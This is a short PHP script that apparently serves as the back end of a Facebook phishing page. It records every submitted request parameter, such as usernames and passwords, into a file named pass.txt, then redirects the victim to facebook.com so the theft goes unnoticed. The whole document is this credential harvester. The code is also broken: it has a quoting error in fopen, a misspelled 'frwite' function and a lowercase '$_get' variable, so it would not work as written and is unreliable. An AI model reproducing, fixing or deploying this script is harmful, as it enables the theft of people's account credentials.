<?php
header('location: http://facebook.com');
$handle = fopen ("pass.txt"' "a");
foreach ($_get as $variable => $value) {
frwite ($handle, $variable);
frwite ($handle, "=");
frwite ($handle, $value);
frwite ($handle, "\r\n");
}
frwite ($handle, "\r\n");
fclose ($handle);
exit;
?>
